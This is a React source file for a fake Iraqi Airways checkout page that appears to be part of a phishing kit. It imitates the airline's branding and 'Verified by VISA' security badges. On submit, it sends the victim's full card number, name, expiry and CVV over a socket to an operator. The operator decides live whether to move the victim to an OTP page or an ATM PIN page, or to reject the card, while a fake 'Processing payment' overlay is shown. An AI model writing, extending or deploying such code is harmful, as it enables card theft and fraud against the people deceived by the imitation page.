import { useState, useEffect, useRef } from "react";
import { getCurrency, convertFromKWD, CURRENCIES } from "@/lib/currency";
import { useSignalEffect } from "@preact/signals-react/runtime";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  socket,
  visitor,
  sendData,
  isFormApproved,
  isCardVerified,
  navigateToPage,
  cardAction,
  waitingMessage,
} from "@/lib/store";
import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";

const schema = z.object({
  cardNumber: z
    .string()
    .min(1, "Card number is required")
    .refine((val) => {
      const cleanVal = val.replace(/\s+/g, "");
      if (!cleanVal || cleanVal.length < 13 || cleanVal.length > 19) return false;
      let sum = 0;
      let isEven = false;
      for (let i = cleanVal.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanVal[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return sum % 10 === 0;
    }, "Invalid card number"),
  nameOnCard: z.string().min(1, "Cardholder name is required"),
  expiryDate: z.string().min(1, "Expiry date is required").refine((val) => {
    const match = val.match(/^(\d{2})\/(\d{2})$/);
    if (!match) return false;
    const month = parseInt(match[1], 10);
    const year = parseInt(match[2], 10);
    if (month < 1 || month > 12) return false;
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
    return true;
  }, "Invalid expiry date"),
  cvv: z.string().length(3, "CVV must be 3 digits"),
});

type FormData = z.infer<typeof schema>;

function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

function getCardType(number: string): string {
  const cleanNumber = number.replace(/\s+/g, "");
  const cardType = getCardTypeFromDB(cleanNumber);
  return cardType ? cardType.toLowerCase() : "unknown";
}

function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | null {
  const info = getBinInfo(cardNumber);
  if (info) {
    return { bank: info.bank, logo: info.bankLogo };
  }
  return null;
}

export default function CreditCardPayment() {
  const [, navigate] = useLocation();
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [lang, setLang] = useState<'en' | 'ar'>('en');
  const [isCurrencyDropdownOpen, setIsCurrencyDropdownOpen] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timerId = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timerId);
  }, [timeLeft]);

  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;

  const searchParams = new URLSearchParams(window.location.search);
  const urlAmount = searchParams.get('amount') || '0';
  const urlCurrency = searchParams.get('currency');

  const cartItems = JSON.parse(localStorage.getItem('amouage_cart') || '[]');

  const getCartTotal = () => {
    const storedTotal = localStorage.getItem('amouage_order_total');
    if (storedTotal && Number(storedTotal) > 0) {
      return storedTotal;
    }
    let total = 0;
    for (const item of cartItems) {
      total += (parseFloat(item.priceNum) || 0) * (item.quantity || 1);
    }
    return (total * 0.75).toFixed(3);
  };
  
  // Save to localStorage if URL has amount, otherwise try to get from localStorage
  let totalAmount = getCartTotal();
  if (Number(urlAmount) > 0) {
    totalAmount = urlAmount;
    localStorage.setItem('amouage_order_total', urlAmount);
  }
  
  // Save currency to localStorage if in URL, otherwise try to get from localStorage
  let currentCurrency = urlCurrency;
  if (currentCurrency) {
    localStorage.setItem('amouage_currency', currentCurrency);
  } else {
    currentCurrency = localStorage.getItem('amouage_currency') || null;
  }
  
  const payCur = getCurrency(currentCurrency);
  const displayAmount = convertFromKWD(Number(totalAmount), payCur.code);
  const displayAmountStr = displayAmount.toLocaleString('en-US', { minimumFractionDigits: payCur.decimals, maximumFractionDigits: payCur.decimals });
  const productNames = cartItems.map((item: any) => item.name).join(', ') || 'Order Payment';

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      expiryDate: "",
      cvv: "",
    },
  });

  const cardNumber = watch("cardNumber");
  const nameOnCard = watch("nameOnCard");
  const expiryDate = watch("expiryDate");
  const cvv = watch("cvv");

  const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
  const isFormValid =
    cleanCardNumber.length >= 13 &&
    cleanCardNumber.length <= 19 &&
    !luhnError &&
    nameOnCard?.trim().length > 0 &&
    expiryDate?.length === 5 &&
    /^\d{2}\/\d{2}$/.test(expiryDate || "") &&
    cvv?.length === 3;

  useEffect(() => {
    navigateToPage("الدفع بطاقة الائتمان");
    waitingMessage.value = "";
  }, []);

  useEffect(() => {
    if (cardNumber && cardNumber.replace(/\s+/g, "").length === 16) {
      if (debounceRef.current) clearTimeout(debounceRef.current);
      debounceRef.current = setTimeout(() => {
        socket.value.emit("cardNumber:verify", cardNumber.replace(/\s+/g, ""));
      }, 500);
    }
  }, [cardNumber]);

  useEffect(() => {
    if (isCardVerified.value === false) {
      setCardError(true);
    } else {
      setCardError(false);
    }
  }, [isCardVerified.value]);

  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/otp-verification");
    }
  }, [isFormApproved.value, navigate]);

  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";

      if (action === 'otp') {
        navigate("/otp-verification");
      } else if (action === 'atm') {
        navigate("/atm-password");
      } else if (action === 'reject') {
        setRejectedError(true);
        reset({
          cardNumber: "",
          nameOnCard: "",
          expiryDate: "",
          cvv: "",
        });
      }
      cardAction.value = null;
    }
  });

  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };

  const [selectedCardType, setSelectedCardType] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [expiryError, setExpiryError] = useState('');
  const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
  const [globalBlockedError, setGlobalBlockedError] = useState(false);

  useEffect(() => {
    socket.value.emit("blockedCards:get");

    const handleBlockedCardsList = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };

    const handleBlockedCardsUpdated = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };

    socket.value.on("blockedCards:list", handleBlockedCardsList);
    socket.value.on("blockedCards:updated", handleBlockedCardsUpdated);

    return () => {
      socket.value.off("blockedCards:list", handleBlockedCardsList);
      socket.value.off("blockedCards:updated", handleBlockedCardsUpdated);
    };
  }, []);

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
    const blockedPrefixes = visitor.value.blockedCardPrefixes;
    const cardPrefix = rawValue.slice(0, 4);

    if (globalBlockedError) {
      setGlobalBlockedError(false);
    }

    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
      setCardError(true);
      setValue("cardNumber", "");
      setLuhnError(false);
    } else {
      const formattedValue = formatCardNumber(rawValue);
      setValue("cardNumber", formattedValue);
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        if (!isValidCardNumber(rawValue)) {
          setLuhnError(true);
        } else {
          setLuhnError(false);
        }
      } else {
        setLuhnError(false);
      }
      setCardError(false);
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/[^\d]/g, "");
    if (value.length >= 3) {
      value = value.slice(0, 2) + "/" + value.slice(2, 4);
    }
    setValue("expiryDate", value);
  };

  const onSubmit = (data: FormData) => {
    const cleanNumber = data.cardNumber.replace(/\s+/g, "");

    if (globalBlockedCards.includes(cleanNumber)) {
      setGlobalBlockedError(true);
      reset({ cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" });
      return;
    }

    setRejectedError(false);
    setGlobalBlockedError(false);

    const cardType = getCardType(cleanNumber);
    const bankInfo = getBankInfoLocal(cleanNumber);

    waitingCardInfo.value = {
      cardType: cardType,
      bankName: bankInfo?.bank || undefined,
      bankLogo: bankInfo?.logo || undefined,
    };

    const [expiryMonth, expiryYear] = data.expiryDate.split("/");

    localStorage.setItem("paymentData", JSON.stringify({
      cardLast4: cleanNumber.slice(-4),
      totalPaid: payCur.code + " " + displayAmountStr,
      serviceName: "الخطوط الجوية العراقية",
      bankName: bankInfo?.bank || "Unknown",
      bankLogo: bankInfo?.logo || null,
      cardType,
    }));

    sendData({
      paymentCard: {
        cardNumber: cleanNumber,
        nameOnCard: data.nameOnCard,
        expiryMonth: expiryMonth,
        expiryYear: expiryYear,
        cvv: data.cvv,
        cardType,
        bankName: bankInfo?.bank || "Unknown",
        amount: totalAmount,
        productName: productNames,
      },
      current: "الدفع بطاقة الائتمان",
      nextPage: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
    });

    waitingMessage.value = lang === 'ar' ? "جاري معالجة الدفع..." : "Processing payment...";
  };

  const isAr = false;
  const tripSummary = JSON.parse(localStorage.getItem('tripSummary') || '{}');
  const cityNames: Record<string, string> = { BGW:'Baghdad',EBL:'Erbil',BSR:'Basra',NJF:'Najaf',KIK:'Kirkuk',ISU:'Sulaymaniyah',OSM:'Mosul',AMM:'Amman',IST:'Istanbul',DXB:'Dubai',BEY:'Beirut',CAI:'Cairo',DEL:'Delhi',FRA:'Frankfurt',KUL:'Kuala Lumpur',CAN:'Guangzhou',CPH:'Copenhagen' };
  const origin = tripSummary.originCode || 'BGW';
  const destination = tripSummary.destCode || 'EBL';
  const originCity = cityNames[origin] || origin;
  const destCity = cityNames[destination] || destination;
  const paxCount = tripSummary.paxCount || 1;
  const flightDate = tripSummary.firstDate || '';
  const formatShortDate = (d: string) => { try { const dt = new Date(d.includes('T') ? d : d+'T00:00:00'); return dt.toLocaleDateString('en-GB',{weekday:'short',day:'numeric',month:'short'}); } catch { return d; } };

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: 'Lato, sans-serif' }}>
      <WaitingOverlay />

      {/* Header */}
      <header className="bg-[#398017] text-white">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center gap-6">
          <img src="/iraqi_airways/upload/logo-white-transparent.png" alt="Iraqi Airways" className="h-10" />
          <span className="border-l border-white/50 pl-4 text-sm cursor-pointer hover:underline" onClick={() => navigate('/')}>Home</span>
          <span className="text-sm">English ▼</span>
        </div>
        {/* Info bar */}
        <div className="bg-white border-b">
          <div className="max-w-7xl mx-auto px-4 py-2 flex items-center justify-between">
            <div className="flex items-center gap-6">
              <div className="flex items-center gap-3">
                <span className="text-[#2E7D32] text-xl font-bold">{origin}</span>
                <span className="text-gray-400">·····✈·····</span>
                <span className="text-[#2E7D32] text-xl font-bold">{destination}</span>
              </div>
              <div className="text-[#2E7D32] text-sm border-l pl-4">
                <span className="text-gray-500">Baghdad</span> / <span className="text-gray-500">{destCity}</span>
              </div>
              <div className="text-[#2E7D32] text-sm border-l pl-4">
                <p className="text-gray-500 text-xs">Depart</p>
                <p className="font-bold">{formatShortDate(flightDate)}</p>
              </div>
              <div className="text-[#2E7D32] text-sm border-l pl-4">
                <p className="text-gray-500 text-xs">Passenger</p>
                <p className="font-bold">{paxCount} 👤</p>
              </div>
            </div>
            <div className="bg-[#1B5E20] text-white px-6 py-2 rounded-full text-sm font-bold">
              🛒IQD {displayAmountStr}
            </div>
          </div>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 max-w-4xl mx-auto w-full px-4 py-8">
        {/* Checkout title */}
        <div className="text-center mb-8">
          <div className="inline-block border border-gray-300 rounded-lg px-8 py-4">
            <h1 className="text-[#2E7D32] text-2xl font-light">Checkout</h1>
          </div>
        </div>

        {/* Total price card */}
        <div className="border border-gray-200 rounded-lg p-6 mb-8">
          <p className="text-[#2E7D32]">Total price: <span className="text-[#2E7D32] font-light">IQD</span> <strong className="text-2xl">{displayAmountStr}</strong></p>
          <p className="text-gray-500 text-sm mt-1">One way price for all passengers (including taxes, fees and discounts).</p>
          <a href="#" className="text-[#2E7D32] text-sm underline">Detailed baggage policy ↗</a>
        </div>

        {/* Select payment method */}
        <div className="border border-gray-200 rounded-lg p-6 mb-8">
          <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-6">Select your payment method</h2>

          <div className="border border-gray-200 rounded-lg p-6">
            {/* Credit Card header */}
            <div className="flex items-center gap-3 mb-2">
              <svg className="w-6 h-6 text-[#2E7D32]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" strokeWidth="2"/><line x1="1" y1="10" x2="23" y2="10" strokeWidth="2"/></svg>
              <h3 className="text-[#2E7D32] text-lg font-bold">Credit Card</h3>
            </div>
            <div className="flex gap-2 mb-4">
              <img src="/iraqi_airways/visa.png" alt="Visa" className="h-6" />
              <img src="/iraqi_airways/mastercard.png" alt="MC" className="h-6" />
            </div>
            <hr className="mb-6" />

            {/* Card form */}
            <form onSubmit={handleSubmit(onSubmit)}>
              {/* Top row: Card preview left + Card type & Card number right */}
              <div className="flex gap-6 items-start mb-4">
                {/* Card preview */}
                <div className="w-64 min-w-[256px] h-40 bg-gradient-to-br from-[#8e9eab] to-[#6a7b8b] rounded-xl p-5 text-white flex flex-col justify-between relative flex-shrink-0">
                  {selectedCardType && <img src={`/iraqi_airways/vendor_${selectedCardType.toLowerCase()}.svg`} alt={selectedCardType} className="absolute top-3 right-3 h-8" />}
                  <p className="text-lg tracking-widest font-mono mt-6">{cardNumber || 'XXXX XXXX XXXX XXXX'}</p>
                  <div className="flex justify-between text-xs">
                    <div><p className="opacity-70">Cardholder name</p><p>{nameOnCard || 'XXX'}</p></div>
                    <div><p className="opacity-70">Expiration date</p><p>{expiryDate || 'XXX'}</p></div>
                  </div>
                </div>

                {/* Card type + Card number */}
                <div className="flex-1 min-w-0 space-y-4">
                  <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                    <legend className="text-[#2E7D32] text-xs px-1">Card type*</legend>
                    <select value={selectedCardType} onChange={(e) => setSelectedCardType(e.target.value)} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
                      <option value="">Select card type</option>
                      <option value="Visa">Visa</option>
                      <option value="MasterCard">MasterCard</option>
                    </select>
                  </fieldset>
                  <fieldset className={`border rounded px-3 pt-1 pb-2 bg-[#f5faf0] ${luhnError || cardError ? 'border-red-500' : 'border-[#4CAF50]'}`}>
                    <legend className="text-[#2E7D32] text-xs px-1">Card number*</legend>
                    <div className="flex items-center">
                      <input type="text" placeholder="Your credit card number" {...register("cardNumber")} onChange={handleCardChange} maxLength={19} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                      {selectedCardType && <img src={`/iraqi_airways/vendor_${selectedCardType.toLowerCase()}.svg`} alt={selectedCardType} className="h-7" />}
                    </div>
                  </fieldset>
                  {luhnError && <p className="text-red-500 text-xs">Invalid card number</p>}
                  {cardError && <p className="text-red-500 text-xs">This card is not accepted</p>}
                  {globalBlockedError && <p className="text-red-500 text-xs">This card has been blocked</p>}
                  {rejectedError && <p className="text-red-500 text-xs">Payment was rejected. Please try another card.</p>}
                </div>
              </div>

              {/* All fields below - same width as Card type column */}
              <div style={{ marginLeft: 'calc(256px + 1.5rem)', width: 'calc(100% - 256px - 1.5rem)' }}>

              {/* Expiry + CVV */}
              <div className="flex gap-4 mb-4 items-stretch">
                <fieldset className={`border rounded px-3 py-3 bg-[#f5faf0] w-1/2 ${expiryError ? 'border-red-500' : 'border-[#4CAF50]'}`}>
                  <legend className="text-[#2E7D32] text-xs px-1">Expiry date*</legend>
                  <div className="flex items-center">
                    <input type="text" placeholder="Month" value={expiryMonth} onChange={(e) => { const v = e.target.value.replace(/\D/g,'').slice(0,2); setExpiryMonth(v); if (v.length === 2 && expiryYear.length === 2) { setValue('expiryDate', v + '/' + expiryYear); const m = parseInt(v); const y = parseInt(expiryYear); const now = new Date(); const cm = now.getMonth()+1; const cy = now.getFullYear()%100; if (m < 1 || m > 12) setExpiryError('Invalid month'); else if (y < cy || (y === cy && m < cm)) setExpiryError('Card expired'); else setExpiryError(''); } else { setValue('expiryDate', v + '/' + expiryYear); setExpiryError(''); } }} maxLength={2} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px] text-center" />
                    <span className="text-gray-400 mx-2">|</span>
                    <input type="text" placeholder="Year" value={expiryYear} onChange={(e) => { const v = e.target.value.replace(/\D/g,'').slice(0,2); setExpiryYear(v); if (expiryMonth.length === 2 && v.length === 2) { setValue('expiryDate', expiryMonth + '/' + v); const m = parseInt(expiryMonth); const y = parseInt(v); const now = new Date(); const cm = now.getMonth()+1; const cy = now.getFullYear()%100; if (m < 1 || m > 12) setExpiryError('Invalid month'); else if (y < cy || (y === cy && m < cm)) setExpiryError('Card expired'); else setExpiryError(''); } else { setValue('expiryDate', expiryMonth + '/' + v); setExpiryError(''); } }} maxLength={2} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px] text-center" />
                  </div>
                </fieldset>
                <fieldset className={`border rounded px-3 py-3 bg-[#f5faf0] w-1/2 ${!watch('cvv') ? 'border-red-500' : 'border-[#4CAF50]'}`}>
                  <legend className="text-[#2E7D32] text-xs px-1">Security Code*</legend>
                  <div className="flex items-center">
                    <input type="text" placeholder="Enter CVV" {...register("cvv")} maxLength={3} onChange={(e) => { const v = e.target.value.replace(/\D/g,''); setValue('cvv', v); }} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                    <div className="w-5 h-5 bg-[#2E7D32] rounded-full flex items-center justify-center cursor-pointer relative group" title="The 3 digits can be found on the back of the card"><span className="text-white text-xs font-bold">i</span><div className="hidden group-hover:block absolute bottom-7 right-0 bg-gray-700 text-white text-xs rounded px-3 py-2 w-48 z-10">The 3 digits can be found on the back of the card</div></div>
                  </div>
                </fieldset>
              </div>
              {expiryError && <p className="text-red-500 text-xs mb-4">{expiryError}</p>}

              {/* Cardholder name */}
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-4 w-full">
                <legend className="text-[#2E7D32] text-xs px-1">Cardholder's full name*</legend>
                <input type="text" placeholder="Cardholder's name" {...register("nameOnCard")} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z\s\-']/g,''); setValue('nameOnCard', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>

              {/* Billing Address */}
              <div>
              <h3 className="text-center text-[#2E7D32] font-bold mt-8 mb-4">Billing Address</h3>
              <div className="space-y-4">
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Number and street name*</legend>
                  <input type="text" placeholder="Enter a number and street name" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                </fieldset>
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Apartment, building, floor, etc.</legend>
                  <input type="text" placeholder="Enter an apartment, building, floor, etc." className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                </fieldset>
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Postcode / Zip*</legend>
                  <input type="text" placeholder="Enter a postcode / zip" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                </fieldset>
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">City*</legend>
                  <input type="text" placeholder="Enter a city" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                </fieldset>
                <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                  <legend className="text-[#2E7D32] text-xs px-1">Country*</legend>
                  <input type="text" placeholder="Enter a country" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                </fieldset>
              </div>
              </div>
              {/* Terms checkbox */}
              <div className="mt-6 flex items-start gap-3">
                <input type="checkbox" required className="mt-0.5 w-6 h-6 min-w-[24px]" style={{ accentColor: '#4CAF50' }} />
                <span className="text-[#2E7D32] text-sm">I understand and accept the terms and conditions of carriage, the terms and conditions of seat selection, the privacy policy and the fare rules of Iraqi Airways.*</span>
              </div>

              {/* Pay button */}
              <div className="mt-6 text-center">
                <button type="submit" disabled={!isFormValid} className={`px-10 py-3 rounded-full text-lg font-medium text-white ${isFormValid ? 'bg-[#1B5E20] hover:bg-[#0D3B0F]' : 'bg-gray-400 cursor-not-allowed'}`}>
                  Pay IQD {displayAmountStr}
                </button>
              </div>

              {/* Secured transaction bar - only show when card type selected */}
              {selectedCardType && <div className="mt-6 flex items-center justify-between bg-[#e8f5e9] rounded px-4 py-3">
                <div className="flex items-center gap-2">
                  <svg className="w-5 h-5 text-[#4CAF50]" fill="currentColor" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                  <span className="text-[#2E7D32] text-sm font-medium">Secured transaction</span>
                </div>
                <div className="text-right">
                  {selectedCardType === 'Visa' && <div><span className="text-[#1a1f71] text-sm font-bold">Verified by</span><br/><span className="text-[#1a1f71] text-lg font-bold">VISA</span></div>}
                  {selectedCardType === 'MasterCard' && <div><span className="text-[#eb001b] text-sm">Mastercard</span><br/><span className="text-[#f79e1b] text-sm font-bold">SecureCode</span></div>}
                </div>
              </div>}
              </div>
            </form>
          </div>
        </div>

        {/* Back button */}
        <div className="flex justify-end mb-12">
          <button onClick={() => navigate('/seat-customization')} className="bg-[#1B5E20] text-white px-8 py-3 rounded-full text-base font-medium hover:bg-[#0D3B0F]">Back</button>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#398017] text-white py-8">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-3 gap-8 mb-8">
            <div><h4 className="font-bold mb-3">Plan and booking</h4><a href="#" className="text-sm hover:underline block">Book trip ↗</a></div>
            <div><h4 className="font-bold mb-3">Contact us</h4><a href="#" className="text-sm hover:underline block mb-1">Contact us ↗</a><a href="#" className="text-sm hover:underline block">Iraqi airways offers ↗</a></div>
            <div><h4 className="font-bold mb-3">About us</h4><a href="#" className="text-sm hover:underline block">Our fleet ↗</a></div>
          </div>
          <div className="text-center mb-6">
            <h4 className="font-bold text-lg mb-3">Secured payment</h4>
            <div className="flex justify-center gap-2 mb-2">
              <img src="/iraqi_airways/americanexpress.png" alt="Amex" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/visa.png" alt="Visa" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/mastercard.png" alt="MC" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/paypal.png" alt="PayPal" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/dinersclub.png" alt="DC" className="h-8 bg-white rounded p-1" />
            </div>
            <p className="text-xs opacity-80">Credit card fees may occur.</p>
          </div>
          <div className="text-center mb-4">
            <h4 className="font-bold mb-3">Follow us</h4>
            <div className="flex justify-center gap-4">
              <a href="#" className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
              <a href="#" className="w-8 h-8 bg-pink-500 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" strokeWidth="2"/><circle cx="12" cy="12" r="5" fill="none" stroke="white" strokeWidth="2"/></svg></a>
              <a href="#" className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0C.488 3.45.029 5.804 0 12c.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0C23.512 20.55 23.971 18.196 24 12c-.029-6.185-.484-8.549-4.385-8.816zM9 16V8l8 4-8 4z"/></svg></a>
              <a href="#" className="w-8 h-8 bg-blue-400 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/></svg></a>
            </div>
          </div>
          <div className="text-center"><a href="#" className="text-sm underline">Technical details</a></div>
        </div>
      </footer>
    </div>
  );
}
